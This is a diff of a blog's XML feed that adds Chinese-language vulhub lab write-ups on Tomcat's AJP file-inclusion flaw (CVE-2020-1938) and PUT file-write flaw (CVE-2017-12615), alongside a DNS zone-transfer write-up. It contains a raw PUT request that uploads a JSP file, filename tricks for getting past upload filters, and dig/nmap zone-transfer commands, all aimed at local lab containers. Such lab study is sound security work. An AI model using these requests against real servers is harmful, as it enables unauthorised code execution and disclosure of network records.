@@ -4,11 +4,32 @@
   
   
   <entry>
-    <title>vulhub DNS域传送漏洞</title>
-    <link href="/vulhub-DNS%E5%9F%9F%E4%BC%A0%E9%80%81%E6%BC%8F%E6%B4%9E/"/>
-    <url>/vulhub-DNS%E5%9F%9F%E4%BC%A0%E9%80%81%E6%BC%8F%E6%B4%9E/</url>
+    <title>tomcat AJP文件包含漏洞与PUT写文件漏洞</title>
+    <link href="/tomcat-AJP%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E4%B8%8EPUT%E5%86%99%E6%96%87%E4%BB%B6%E6%BC%8F%E6%B4%9E/"/>
+    <url>/tomcat-AJP%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E4%B8%8EPUT%E5%86%99%E6%96%87%E4%BB%B6%E6%BC%8F%E6%B4%9E/</url>
     
-    <content type="html"><![CDATA[<p>vulhub学习DNS域传送漏洞</p><a id="more"></a><h1 id="vulhub-DNS域传送漏洞"><a href="#vulhub-DNS域传送漏洞" class="headerlink" title="vulhub DNS域传送漏洞"></a>vulhub DNS域传送漏洞</h1><h2 id="00-环境搭建"><a href="#00-环境搭建" class="headerlink" title="00 环境搭建"></a>00 环境搭建</h2><ul><li>docker路径 dns/dns-zone-transfer</li><li>启动 <ul><li>docker-compose build</li><li>docker-compose up -d</li></ul></li><li>关闭 docker-compose down</li></ul><p>环境运行后，将会监听TCP和UDP的53端口，DNS协议同时支持从这两个端口进行数据传输。因为涉及到1024以下的端口号，所以运行上述命令可能需要root权限</p><h2 id="01-原理"><a href="#01-原理" class="headerlink" title="01 原理"></a>01 原理</h2><p>DNS服务器分为：主服务器、备份服务器和缓存服务器。在主备服务器之间同步数据库，需要使用“DNS域传送”。域传送是指后备服务器从主服务器拷贝数据，并用得到的数据更新自身数据库</p><p>DNS服务器配置不当，可能导致匿名用户获取某个域的所有记录。造成整个网络的拓扑结构泄露给潜在的攻击者</p><p>常见DNS记录类型:</p><ul><li>A       IP地址记录,记录一个域名对应的IP地址</li><li>AAAA    IPv6 地址记录，记录一个域名对应的IPv6地址</li><li>CNAME   别名记录，记录一个主机的别名 </li><li>MX      电子邮件交换记录，记录一个邮件域名对应的IP地址，如<a href="mailto:root@xxxx.com">root@xxxx.com</a></li><li>NS      域名服务器记录 ,记录该域名由哪台域名服务器解析</li><li>PTR     反向记录，也即从IP地址到域名的一条记录</li><li>TXT     记录域名的相关文本信息</li><li>SOA记录   start of anthorization 开始授权，是一种比较难以理解的记录值，一般二级域名才会有</li></ul><h2 id="02-使用dig命令"><a href="#02-使用dig命令" class="headerlink" title="02 使用dig命令"></a>02 使用dig命令</h2><p><strong>1. dig @your-ip <a href="http://www.vulhub.org" target="_blank" rel="noopener">www.vulhub.org</a></strong></p><p><img src="1.png" srcset="/img/loading.gif" alt=""></p><p><strong>2. 发送axfr类型的dns请求</strong></p><p><strong>dig @your-ip -t axfr <a href="http://www.vulhub.org" target="_blank" rel="noopener">www.vulhub.org</a></strong></p><p>axfr类型是Authoritative Transfer的缩写，指请求传送某个区域的全部记录</p><p><img src="2.png" srcset="/img/loading.gif" alt=""></p><h2 id="03-使用nmap"><a href="#03-使用nmap" class="headerlink" title="03 使用nmap"></a>03 使用nmap</h2><p>所用脚本：dns-zone-transfer.nse</p><p>参数设置：dns-zone-transfer.domain=vulhub.org</p><p>完整命令：nmap –script dns-zone-transfer.nse –script-args “dns-zone-transfer.domain=vulhub.org” -Pn -p 53 your-ip</p><p><img src="3.png" srcset="/img/loading.gif" alt=""></p>]]></content>
+    <content type="html"><![CDATA[<p>vulhub学习AJP文件包含漏洞与PUT写文件漏洞</p><a id="more"></a><h1 id="AJP文件包含漏洞与PUT写文件漏洞"><a href="#AJP文件包含漏洞与PUT写文件漏洞" class="headerlink" title="AJP文件包含漏洞与PUT写文件漏洞"></a>AJP文件包含漏洞与PUT写文件漏洞</h1><h2 id="AJP文件包含漏洞CVE-2020-1938"><a href="#AJP文件包含漏洞CVE-2020-1938" class="headerlink" title="AJP文件包含漏洞CVE-2020-1938"></a>AJP文件包含漏洞CVE-2020-1938</h2><h3 id="00-环境搭建"><a href="#00-环境搭建" class="headerlink" title="00 环境搭建"></a>00 环境搭建</h3><ul><li>docker路径 tomcat/CVE-2020-1938</li><li>启动 <ul><li>docker-compose build</li><li>docker-compose up -d</li></ul></li><li>关闭 docker-compose down</li></ul><h3 id="01-原理"><a href="#01-原理" class="headerlink" title="01 原理"></a>01 原理</h3><p>tomcat默认的conf/server.xml中配置了2个Connector，一个为8080的对外提供的HTTP协议端口，另外一个就是默认的8009 AJP协议端口</p><p>漏洞是Tomcat AJP协议存在缺陷而导致，攻击者利用漏洞可以构造特定参数，读取服务器webapp/ROOT下的任意文件。若目标服务器同时存在文件上传功能，攻击者可进一步通过文件包含实现远程代码执行</p><p><strong>影响范围</strong></p><ul><li>Apache Tomcat 6</li><li>Apache Tomcat 7 &lt; 7.0.100</li><li>Apache Tomcat 8 &lt; 8.5.51</li><li>Apache Tomcat 9 &lt; 9.0.31</li></ul><h3 id="02-复现"><a href="#02-复现" class="headerlink" title="02 复现"></a>02 复现</h3><p>从docker启动镜像，打开ip:8080</p><p><img src="1.png" srcset="/img/loading.gif" alt=""></p><p>启动成功，版本为9.0.30</p><p><a href="https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi/" target="_blank" rel="noopener">POC</a> </p><p><strong>注意要用python2运行</strong></p><p>使用方法：</p><p><img src="2.png" srcset="/img/loading.gif" alt=""></p><p>默认端口8009</p><p>默认读取文件路径WEB-INF/web.xml</p><p>运行后读取成功</p><p><img src="3.png" srcset="/img/loading.gif" alt=""></p><h2 id="PUT写文件漏洞CVE-2017-12615"><a href="#PUT写文件漏洞CVE-2017-12615" class="headerlink" title="PUT写文件漏洞CVE-2017-12615"></a>PUT写文件漏洞CVE-2017-12615</h2><h3 id="00-环境搭建-1"><a href="#00-环境搭建-1" class="headerlink" title="00 环境搭建"></a>00 环境搭建</h3><ul><li>docker路径 tomcat/CVE-2017-12615</li><li>启动 <ul><li>docker-compose build</li><li>docker-compose up -d</li></ul></li><li>关闭 docker-compose down</li></ul><h3 id="01-原理-1"><a href="#01-原理-1" class="headerlink" title="01 原理"></a>01 原理</h3><p>漏洞的产生是由于配置不当（非默认配置），将配置文件（conf/web.xml）中的readonly设置为了false，导致可以使用PUT方法上传任意文件</p><h3 id="02-复现-1"><a href="#02-复现-1" class="headerlink" title="02 复现"></a>02 复现</h3><p>从docker启动镜像，打开ip:8080</p><p><img src="4.png" srcset="/img/loading.gif" alt=""></p><p>启动成功，版本为8.5.19</p><p>用burpsuite发包，查看响应发现写入成功</p><p><img src="5.png" srcset="/img/loading.gif" alt=""></p><p>请求内容</p><pre><code class="hljs"><span class="hljs-keyword">PUT</span> <span class="hljs-string">/test1.jsp/</span> HTTP/1.1<span class="hljs-attribute">Host</span>: 192.168.2.108:8080<span class="hljs-attribute">Accept</span>: */*<span class="hljs-attribute">Accept-Language</span>: en<span class="hljs-attribute">User-Agent</span>: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)<span class="hljs-attribute">Connection</span>: close<span class="hljs-attribute">Content-Type</span>: application/x-www-form-urlencoded<span class="hljs-attribute">Content-Length</span>: 43&lt;%out.println("Hello World");%&gt;</code></pre><p>访问 test1.jsp</p><p><img src="6.png" srcset="/img/loading.gif" alt=""></p><p>成功执行jsp代码</p><p><strong>几个绕过方法</strong></p><ul><li>shell.jsp%20</li><li>shell.jsp::$DATA</li><li>shell.jsp/</li></ul>]]></content>
+    
+    
+    
+    <tags>
+      
+      <tag>漏洞复现</tag>
+      
+      <tag>vulhub</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>vulhub DNS域传送漏洞</title>
+    <link href="/DNS%E5%9F%9F%E4%BC%A0%E9%80%81%E6%BC%8F%E6%B4%9E/"/>
+    <url>/DNS%E5%9F%9F%E4%BC%A0%E9%80%81%E6%BC%8F%E6%B4%9E/</url>
+    
+    <content type="html"><![CDATA[<p>vulhub学习DNS域传送漏洞</p><a id="more"></a><h1 id="DNS域传送漏洞"><a href="#DNS域传送漏洞" class="headerlink" title="DNS域传送漏洞"></a>DNS域传送漏洞</h1><h2 id="00-环境搭建"><a href="#00-环境搭建" class="headerlink" title="00 环境搭建"></a>00 环境搭建</h2><ul><li>docker路径 dns/dns-zone-transfer</li><li>启动 <ul><li>docker-compose build</li><li>docker-compose up -d</li></ul></li><li>关闭 docker-compose down</li></ul><p>环境运行后，将会监听TCP和UDP的53端口，DNS协议同时支持从这两个端口进行数据传输。因为涉及到1024以下的端口号，所以运行上述命令可能需要root权限</p><h2 id="01-原理"><a href="#01-原理" class="headerlink" title="01 原理"></a>01 原理</h2><p>DNS服务器分为：主服务器、备份服务器和缓存服务器。在主备服务器之间同步数据库，需要使用“DNS域传送”。域传送是指后备服务器从主服务器拷贝数据，并用得到的数据更新自身数据库</p><p>DNS服务器配置不当，可能导致匿名用户获取某个域的所有记录。造成整个网络的拓扑结构泄露给潜在的攻击者</p><p>常见DNS记录类型:</p><ul><li>A       IP地址记录,记录一个域名对应的IP地址</li><li>AAAA    IPv6 地址记录，记录一个域名对应的IPv6地址</li><li>CNAME   别名记录，记录一个主机的别名 </li><li>MX      电子邮件交换记录，记录一个邮件域名对应的IP地址，如<a href="mailto:root@xxxx.com">root@xxxx.com</a></li><li>NS      域名服务器记录 ,记录该域名由哪台域名服务器解析</li><li>PTR     反向记录，也即从IP地址到域名的一条记录</li><li>TXT     记录域名的相关文本信息</li><li>SOA记录   start of anthorization 开始授权，是一种比较难以理解的记录值，一般二级域名才会有</li></ul><h2 id="02-使用dig命令"><a href="#02-使用dig命令" class="headerlink" title="02 使用dig命令"></a>02 使用dig命令</h2><p><strong>1. dig @your-ip <a href="http://www.vulhub.org" target="_blank" rel="noopener">www.vulhub.org</a></strong></p><p><img src="1.png" srcset="/img/loading.gif" alt=""></p><p><strong>2. 发送axfr类型的dns请求</strong></p><p><strong>dig @your-ip -t axfr <a href="http://www.vulhub.org" target="_blank" rel="noopener">www.vulhub.org</a></strong></p><p>axfr类型是Authoritative Transfer的缩写，指请求传送某个区域的全部记录</p><p><img src="2.png" srcset="/img/loading.gif" alt=""></p><h2 id="03-使用nmap"><a href="#03-使用nmap" class="headerlink" title="03 使用nmap"></a>03 使用nmap</h2><p>所用脚本：dns-zone-transfer.nse</p><p>参数设置：dns-zone-transfer.domain=vulhub.org</p><p>完整命令：nmap –script dns-zone-transfer.nse –script-args “dns-zone-transfer.domain=vulhub.org” -Pn -p 53 your-ip</p><p><img src="3.png" srcset="/img/loading.gif" alt=""></p>]]></content>
     
     
     
@@ -48,9 +69,9 @@
     
     <tags>
       
-      <tag>工具使用</tag>
-      
       <tag>内网渗透</tag>
+      
+      <tag>工具使用</tag>
       
     </tags>
     
@@ -94,9 +115,9 @@
     
     <tags>
       
-      <tag>工具使用</tag>
-      
       <tag>内网渗透</tag>
+      
+      <tag>工具使用</tag>
       
     </tags>
     
